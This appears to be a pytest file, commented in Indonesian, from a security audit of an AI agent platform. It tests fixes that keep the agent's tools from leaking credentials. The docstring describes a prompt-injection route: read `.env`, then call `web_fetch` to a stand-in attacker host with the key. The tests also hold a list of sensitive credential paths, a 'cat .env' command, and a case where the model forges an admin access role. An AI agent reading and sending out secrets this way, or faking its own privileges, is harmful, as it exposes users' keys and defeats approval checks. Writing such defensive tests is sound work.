"""Audit 2026-09-25 (#3, #10): credential tak boleh bisa dibaca/dikirim keluar
lewat tool agent tanpa approval.

Temuan asli: workspace default `.` (root repo) berisi `.env` → `file_read(".env")`
(tanpa approval) lalu `web_fetch("https://attacker/?k=...")` (tanpa approval) —
satu prompt injection cukup. Selain itu `grep` mengikuti symlink ke luar
workspace, sandbox `shell_run` me-mount `.env` apa adanya, dan `http_request`
bisa me-resolve `vault:<env apa pun>` (termasuk OPENCLAWN_ENCRYPTION_KEY) — di
trust mode tanpa satu klik pun.
"""

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from infra.config import AppConfig
from infra.database import DatabaseManager
from infra.workspace import (
    CURRENT_WORKSPACE_ROOT,
    WorkspaceViolation,
    is_sensitive_path,
    resolve_in_workspace,
)
from core.agent_loop import AgentConfig, AgentLoop
from tools.file_ops import FileReadTool, FileWriteTool
from tools.search import GlobTool, GrepTool
from tools.web import HttpRequestTool, vault_key_allowed


@pytest.fixture
async def db():
    cfg = AppConfig(db_path=":memory:")
    manager = DatabaseManager(cfg)
    conn = await manager.conn()
    with open("migrations/001_initial.sql") as f:
        await conn.executescript(f.read())
        await conn.commit()
    yield manager
    await manager.close()


@pytest.fixture
def workspace(tmp_path):
    """Workspace berisi .env, file biasa, dan symlink ke rahasia DI LUAR workspace."""
    ws = tmp_path / "ws"
    ws.mkdir()
    secret_dir = tmp_path / "secret"
    secret_dir.mkdir()
    (secret_dir / "creds.txt").write_text("TOP_SECRET=hunter2\n")
    (ws / ".env").write_text("ANTHROPIC_API_KEY=sk-ant-xxx\n")
    (ws / ".env.example").write_text("ANTHROPIC_API_KEY=\n")
    (ws / "app.py").write_text("print('SECRET_FREE')\n")
    (ws / "notes.txt").symlink_to(secret_dir / "creds.txt")
    token = CURRENT_WORKSPACE_ROOT.set(str(ws))
    yield ws
    CURRENT_WORKSPACE_ROOT.reset(token)


# ── Deteksi path sensitif ─────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "path,expected",
    [
        ("/p/.env", True),
        ("/p/.env.local", True),
        ("/p/sub/.env.production", True),
        ("/home/u/.ssh/id_rsa", True),
        ("/home/u/.aws/credentials", True),
        ("/p/.env.example", False),
        ("/p/src/env.py", False),
        ("/p/environment.md", False),
    ],
)
def test_is_sensitive_path(path, expected):
    assert is_sensitive_path(Path(path)) is expected


def test_app_db_file_is_sensitive(tmp_path):
    cfg = AppConfig(db_path=str(tmp_path / "data" / "openclawn.db"))
    assert is_sensitive_path((tmp_path / "data" / "openclawn.db").resolve(), cfg)
    assert is_sensitive_path(Path(f"{(tmp_path / 'data' / 'openclawn.db').resolve()}-wal"), cfg)


def test_resolve_in_workspace_rejects_env(workspace):
    with pytest.raises(WorkspaceViolation):
        resolve_in_workspace(".env", str(workspace))
    # Template tetap boleh (tak berisi nilai rahasia).
    assert resolve_in_workspace(".env.example", str(workspace)).name == ".env.example"


# ── Tool file ────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_file_read_env_blocked(workspace):
    """Reproduksi temuan: file_read(".env") SEBELUMNYA sukses tanpa approval."""
    result = await FileReadTool().execute({"path": ".env"}, vault=None)
    assert "error" in result
    assert "sk-ant" not in str(result)


@pytest.mark.asyncio
async def test_file_write_env_blocked(workspace):
    result = await FileWriteTool().execute({"path": ".env", "content": "X=1"}, vault=None)
    assert "error" in result
    assert (workspace / ".env").read_text().startswith("ANTHROPIC_API_KEY")


@pytest.mark.asyncio
async def test_grep_does_not_follow_symlink_out_of_workspace(workspace):
    """Reproduksi temuan #10: grep membaca target symlink di luar workspace."""
    result = await GrepTool().execute({"pattern": "SECRET"}, vault=None)
    texts = [m["text"] for m in result["matches"]]
    assert all("hunter2" not in t for t in texts)
    assert any("SECRET_FREE" in t for t in texts), "file biasa tetap bisa di-grep"


@pytest.mark.asyncio
async def test_grep_skips_env(workspace):
    result = await GrepTool().execute({"pattern": "sk-ant"}, vault=None)
    assert result["matches"] == []


@pytest.mark.asyncio
async def test_glob_hides_escaping_symlink_and_env(workspace):
    result = await GlobTool().execute({"pattern": "*"}, vault=None)
    assert "notes.txt" not in result["matches"]
    assert ".env" not in result["matches"]
    assert "app.py" in result["matches"]


@pytest.mark.asyncio
async def test_glob_parent_pattern_does_not_leak(workspace):
    result = await GlobTool().execute({"pattern": "../secret/*"}, vault=None)
    assert result.get("matches", []) == []


@pytest.mark.asyncio
async def test_glob_absolute_pattern_fails_gracefully(workspace):
    result = await GlobTool().execute({"pattern": "/etc/*"}, vault=None)
    assert "error" in result or result.get("matches") == []


# ── Sandbox shell_run: credential di-mask ────────────────────────────────────


@pytest.mark.asyncio
async def test_run_shell_masks_env_files(workspace):
    from tools.sandbox import DockerSandbox

    (workspace / "sub").mkdir()
    (workspace / "sub" / ".env.local").write_text("K=v")
    (workspace / ".aws").mkdir()
    captured = {}

    async def _fake_exec(*args, **kwargs):
        captured["argv"] = list(args)
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.returncode = 0
        return proc

    with patch("tools.sandbox.asyncio.create_subprocess_exec", side_effect=_fake_exec):
        await DockerSandbox().run_shell("cat .env", str(workspace))

    argv = captured["argv"]
    mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "-v"]
    tmpfs = [argv[i + 1] for i, a in enumerate(argv) if a == "--tmpfs"]
    assert "/dev/null:/work/.env:ro" in mounts
    assert "/dev/null:/work/sub/.env.local:ro" in mounts
    assert not any(".env.example" in m for m in mounts)
    assert any(t.startswith("/work/.aws:ro") for t in tmpfs)
    # Mask harus SEBELUM image (argumen setelah image adalah command container).
    image_idx = next(i for i, a in enumerate(argv) if a.startswith("openclawn-sandbox"))
    assert argv.index("/dev/null:/work/.env:ro") < image_idx


@pytest.mark.asyncio
async def test_run_python_non_utf8_output_does_not_crash():
    from tools.sandbox import DockerSandbox

    async def _fake_exec(*args, **kwargs):
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"\xff\xfe", b""))
        proc.returncode = 0
        return proc

    with patch("tools.sandbox.asyncio.create_subprocess_exec", side_effect=_fake_exec):
        result = await DockerSandbox().run_python("import sys")
    assert result["exit_code"] == 0


# ── http_request: vault key internal ditolak ─────────────────────────────────


@pytest.mark.parametrize(
    "key,allowed",
    [
        ("OPENCLAWN_ENCRYPTION_KEY", False),
        ("OPENCLAWN_AUTH_TOKEN", False),
        ("ANTHROPIC_API_KEY", False),
        ("GOOGLE_API_KEY", False),
        ("GITHUB_TOKEN", True),
    ],
)
def test_vault_key_allowed(key, allowed):
    assert vault_key_allowed(key) is allowed


@pytest.mark.asyncio
async def test_http_request_rejects_internal_vault_key():
    vault = MagicMock()
    vault.get = AsyncMock(return_value="SHOULD_NOT_BE_READ")
    result = await HttpRequestTool().execute(
        {
            "url": "https://example.com",
            "headers": {"X-Key": "vault:OPENCLAWN_ENCRYPTION_KEY"},
        },
        vault=vault,
    )
    assert "error" in result
    vault.get.assert_not_awaited()


@pytest.mark.asyncio
async def test_trust_mode_never_bypasses_http_request_with_vault(db):
    """Trust mode SEBELUMNYA meloloskan http_request ber-`vault:` tanpa klik —
    prompt injection bisa mengirim credential ke host mana pun."""
    agent = AgentLoop(AgentConfig(role="dev", session_id="s-trust-vault"), db=db)
    agent.cfg.trust_mode = True
    agent.approval.request = AsyncMock(return_value=False)
    agent.approval.auto_approve = AsyncMock(
        side_effect=AssertionError("auto_approve tak boleh dipakai untuk vault request")
    )
    result = await agent._execute_tool(
        "http_request",
        {"url": "https://example.com", "headers": {"Authorization": "vault:GITHUB_TOKEN"}},
        bypass_approval=True,
    )
    agent.approval.request.assert_awaited_once()
    assert "ditolak" in result.get("error", "")


# ── db_query (audit 2026-09-25 #11) ──────────────────────────────────────────


@pytest.mark.asyncio
async def test_db_query_denies_identity_tables(db):
    from tools.data import DbQueryTool

    for sql in ("SELECT * FROM users", 'SELECT * FROM "users"', "SELECT env FROM [mcp_servers]"):
        result = await DbQueryTool().execute({"sql": sql}, vault=None, db=db)
        assert "error" in result, sql
    ok = await DbQueryTool().execute({"sql": "SELECT count(*) AS n FROM skills"}, vault=None, db=db)
    assert "rows" in ok


@pytest.mark.asyncio
async def test_db_query_admin_only_when_auth_active(db, monkeypatch):
    import infra.config as config_mod
    from tools.data import DbQueryTool

    monkeypatch.setattr(config_mod, "CONFIG", AppConfig(db_path=":memory:", auth_token="t"))
    sql = {"sql": "SELECT count(*) AS n FROM skills"}
    member = await DbQueryTool().execute({**sql, "_access_role": "member"}, vault=None, db=db)
    assert "error" in member
    admin = await DbQueryTool().execute({**sql, "_access_role": "admin"}, vault=None, db=db)
    assert "rows" in admin


@pytest.mark.asyncio
async def test_agent_loop_overrides_model_supplied_access_role(db, monkeypatch):
    """Model tak boleh mengarang `_access_role: admin` — nilai sistem menang."""
    import infra.config as config_mod

    monkeypatch.setattr(config_mod, "CONFIG", AppConfig(db_path=":memory:", auth_token="t"))
    agent = AgentLoop(AgentConfig(role="dev", session_id="s-dbq", access_role="member"), db=db)
    agent.approval.request = AsyncMock(return_value=True)
    result = await agent._execute_tool(
        "db_query", {"sql": "SELECT 1 AS x", "_access_role": "admin"}
    )
    assert "admin" in result.get("error", "")


# ── OIDC allowlist (audit 2026-09-25 #12) ────────────────────────────────────


def test_oidc_allowlist_rules():
    from security.oidc import OIDCClaims, is_login_allowed

    ok = OIDCClaims("s", "a@corp.example", "A", email_verified=True)
    unverified = OIDCClaims("s", "a@corp.example", "A", email_verified=False)
    outsider = OIDCClaims("s", "x@gmail.com", "X", email_verified=True)
    assert is_login_allowed(ok, (), ())[0] is True  # tanpa allowlist: perilaku lama
    assert is_login_allowed(ok, (), ("corp.example",))[0] is True
    assert is_login_allowed(unverified, (), ("corp.example",))[0] is False
    assert is_login_allowed(outsider, (), ("corp.example",))[0] is False
    assert is_login_allowed(outsider, ("x@gmail.com",), ())[0] is True
